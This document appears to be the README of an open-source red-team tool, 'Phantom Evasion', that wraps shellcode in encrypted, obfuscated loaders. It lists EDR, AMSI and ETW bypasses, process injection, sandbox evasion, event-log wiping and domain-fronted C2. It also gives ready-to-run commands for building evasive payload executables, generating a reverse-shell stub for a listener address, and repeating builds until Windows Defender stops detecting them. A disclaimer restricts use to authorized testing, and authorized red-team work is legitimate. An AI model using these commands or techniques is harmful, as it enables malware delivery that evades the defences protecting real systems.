```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
  ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
  █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
  ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
  ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
  ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

# Phantom Evasion

**Payload Obfuscation + EDR/XDR Bypass Engine for Authorized Red Team Operations**

---

> ## ⚠️ LEGAL DISCLAIMER ⚠️
>
> **Phantom Evasion is intended for AUTHORIZED penetration testing and security research ONLY.**
>
> - You **MUST** have **explicit written permission** from the target system/network owner before use.
> - Unauthorized use of this tool against systems you do not own or have permission to test is **illegal** and may result in criminal prosecution.
> - The authors and contributors of this project **assume NO liability** for any illegal or unethical use of this software.
> - This tool is provided for **defensive security research**, **red team exercises**, and **authorized penetration testing** only.
>
> **By using this tool you agree that you hold all necessary authorizations and accept full legal responsibility for your actions.**

---

## Features

### Layer 1 – Static Evasion
| Technique | Description |
|-----------|-------------|
| `xor` | XOR encryption with random multi-byte key |
| `aes` | AES-256-CBC encryption (Windows BCrypt API decryption stub) |
| `rc4` | RC4 stream cipher with random key |
| `chacha20` | ChaCha20-IETF with embedded portable C decryption stub |
| `string_obfuscate` | Compile-time XOR encoding of string literals |
| `junk_code` | Random valid C blocks to inflate entropy and confuse signatures |
| `polymorphic` | Randomised variable/function names per build |
| `control_flow_flatten` | Switch-case state-machine dispatcher pattern |
| `string_encrypt_stack` | Stack string construction — builds API names char-by-char at runtime |

### Layer 2 – EDR Bypass
| Technique | Description |
|-----------|-------------|
| `direct_syscalls` | Inline `syscall` asm stubs bypassing ntdll hooks |
| `indirect_syscalls` | Jump to `syscall;ret` gadget inside ntdll.dll |
| `unhook_ntdll` | Restore ntdll .text from clean on-disk copy |
| `api_hashing` | Resolve APIs by ROR-13 hash via PEB walking (no IAT entries) |
| `hells_gate` | Dynamic SSN resolution + Halo's Gate hooked-stub fallback |
| `module_stomping` | Overwrite signed DLL (.text section) with shellcode; execute from legitimate module address space |

### Layer 3 – ETW/AMSI Bypass
| Technique | Description |
|-----------|-------------|
| `patch_etw` | Patch `EtwEventWrite` → `xor eax,eax; ret` |
| `patch_amsi` | Patch `AmsiScanBuffer` → return `E_INVALIDARG` |

### Layer 4 – Behavioral Evasion
| Technique | Description |
|-----------|-------------|
| `classic` | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread |
| `apc` | QueueUserAPC injection into alertable thread |
| `early_bird` | APC into suspended process before entry-point execution |
| `callback` | Shellcode via Win32 enumeration callbacks (EnumDesktopWindows, etc.) |
| `thread_hijack` | Suspend thread, redirect RIP to shellcode, resume — no new thread created |
| `fiber_injection` | ConvertThreadToFiber + CreateFiber + SwitchToFiber — avoids CreateThread telemetry |
| `sleep_encrypt` | XOR-encrypt in-memory shellcode during sleep (Ekko-style) |
| `env_checks` | VM/sandbox/debugger detection (RDTSC, CPU count, RAM, disk, processes) |
| `resource_check` | Resource-based sandbox detection (CPU cores, RAM, disk, screen res, process count, idle time) |
| `parent_spoof` | PPID spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` |
| `delayed_exec` | CPU-burn delay + business-hours + user-activity gating |
| `process_masquerade` | PEB `ImagePathName`/`CommandLine` overwrite |
| `network_evasion` | HTTPS C2 with jitter, random UA, domain-fronting skeleton |
| `log_tampering` | Clear Windows Event Logs + USN journal |

---

## Architecture

```
main.py (CLI – Click + Rich)
    │
    ├── core/loader.py         ← Load & validate shellcode (.bin/.raw/.hex/.txt)
    ├── core/obfuscator.py     ← Orchestrate 4-layer evasion pipeline
    ├── core/compiler.py       ← Compile C/Rust/Go loaders (MinGW/rustc/go)
    └── core/tester.py         ← Iterative obfuscate-test loop
            │
            ├── techniques/encryption/      ← XOR, AES, RC4, ChaCha20
            ├── techniques/obfuscation/     ← String, junk, polymorphic, CFF
            ├── techniques/edr_bypass/      ← Syscalls, unhooking, API hash, Hell's Gate
            ├── techniques/etw_bypass/      ← ETW, AMSI patches
            ├── techniques/injection/       ← Classic, APC, Early Bird, Callback
            ├── techniques/sandbox_evasion/ ← Sleep encrypt, env checks, PPID, delay
            └── techniques/xdr_evasion/    ← PEB masq., network, log tampering
            │
            ├── templates/loader_c.c        ← C loader template (MinGW)
            ├── templates/loader_rust.rs    ← Rust loader template
            └── templates/loader_go.go      ← Go loader template
            │
            └── av_test/                   ← Windows Defender scanning + reports
```

---

## Installation

### Prerequisites
- Python 3.10+
- (Optional) `x86_64-w64-mingw32-gcc` for C compilation
- (Optional) `rustc` with `x86_64-pc-windows-gnu` target for Rust compilation
- (Optional) Go toolchain for Go compilation
- Windows Defender / `MpCmdRun.exe` for AV testing

### Setup

```bash
git clone https://github.com/phantom-evasion/phantom-evasion.git
cd phantom-evasion
pip install -r requirements.txt
```

Install MinGW cross-compiler (Linux):
```bash
sudo apt-get install mingw-w64
```

---

## Test Shellcode Generator

Don't have Metasploit / msfvenom?  Use the built-in test shellcode generator to
create safe payloads for exercising the obfuscation pipeline.

```bash
# Windows x64 MessageBoxA (pops a dialog — safe, no network)
python tools/generate_test_shellcode.py --type messagebox

# Windows x64 WinExec("calc.exe") — opens Calculator
python tools/generate_test_shellcode.py --type calc --output output/test_payloads/calc.bin

# NOP-sled + INT3 breakpoint (custom size)
python tools/generate_test_shellcode.py --type nop --size 512

# TCP reverse-shell stub (template with embedded IP/port)
python tools/generate_test_shellcode.py --type reverse_shell \
    --lhost 192.168.1.100 --lport 4444 --output shell.bin
```

### End-to-end test workflow

```bash
# 1. Generate a test payload
python tools/generate_test_shellcode.py --type calc --output output/test_payloads/calc.bin

# 2. Obfuscate with Phantom Evasion
python main.py -i output/test_payloads/calc.bin -o output/stealth \
    --encryption aes --edr-bypass full

# 3. Inspect the generated C source
cat output/stealth.c
```

### Generator options

| Option | Default | Description |
|--------|---------|-------------|
| `--type` | required | `messagebox` \| `calc` \| `nop` \| `reverse_shell` |
| `--output` | `output/test_payloads/<type>.bin` | Output `.bin` file path |
| `--size` | `512` | NOP-sled size in bytes (`--type nop` only) |
| `--lhost` | — | Listener IP (`--type reverse_shell`) |
| `--lport` | `4444` | Listener port (`--type reverse_shell`) |

---

## Usage

### Basic Usage

```bash
# AES-256 encryption + full EDR bypass → C loader → output/payload.exe
python main.py -i shellcode.bin -o output/payload --encryption aes --edr-bypass full

# XOR encryption, Rust loader
python main.py -i shellcode.bin -o output/payload --encryption xor --loader rust

# ChaCha20, Go loader, APC injection
python main.py -i shellcode.bin -o output/payload \
    --encryption chacha20 --loader go -t apc

# Iterative obfuscation until AV bypass (max 10 attempts)
python main.py -i shellcode.bin -o output/payload --test-av --iterations 10

# List all available techniques
python main.py --list-techniques
```

### CLI Reference

```
Options:
  -i, --input PATH          Input shellcode file (.bin/.raw/.hex/.txt)
  -o, --output PATH         Output file path without extension [default: output/payload]
  --format [exe|dll|bin]    Output format [default: exe]
  --edr-bypass [none|basic|full]
                            EDR bypass level [default: full]
  -t, --techniques TEXT     Extra techniques to apply (repeatable)
  -e, --encryption [xor|aes|rc4|chacha20]
                            Encryption scheme [default: aes]
  -l, --loader [c|rust|go]  Loader language [default: c]
  --test-av                 Test output against Windows Defender
  --iterations INTEGER      Max obfuscation iterations [default: 10]
  --list-techniques         List all available techniques and exit
  --help                    Show this message and exit.
```

### Shellcode Input Formats

| Extension | Format |
|-----------|--------|
| `.bin`, `.raw` | Raw binary bytes |
| `.hex`, `.txt` | Hex-encoded (supports `\xNN`, `0xNN`, plain hex) |

---

## Techniques Reference

### Encryption Schemes

| Scheme | Module | Key Size | Algorithm |
|--------|--------|----------|-----------|
| `xor` | `xor_encrypt.py` | 4–32 bytes random | Multi-byte XOR |
| `aes` | `aes_encrypt.py` | 256-bit | AES-256-CBC (BCrypt) |
| `rc4` | `rc4_encrypt.py` | 16–64 bytes | ARCFOUR |
| `chacha20` | `chacha20_encrypt.py` | 256-bit | ChaCha20-IETF |

### EDR Bypass Levels

| Level | Techniques Applied |
|-------|--------------------|
| `none` | No EDR bypass |
| `basic` | API hashing + direct syscalls + ntdll unhooking |
| `full` | All of the above + indirect syscalls + Hell's Gate |

---

## Output

The pipeline produces:
- **Compiled binary** – `output/payload.exe` (or `.dll`, `.bin`)
- **Detection report** – `output/detection_report_<timestamp>.md` (when `--test-av` is used)
- **C source** – `output/payload.c` (fallback when compiler is not installed)

---

## Configuration

Edit `config.yaml` to change defaults:

```yaml
phantom_evasion:
  default_encryption: aes
  default_edr_bypass: full
  default_loader: c
  default_format: exe
  max_iterations: 10
  compiler:
    c: x86_64-w64-mingw32-gcc
    rust: rustc
    go: go
  output_dir: output/
```

---

## License

MIT License

Copyright (c) 2024 Phantom Evasion Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

> **Remember: Only use this tool on systems you own or have explicit written permission to test.**
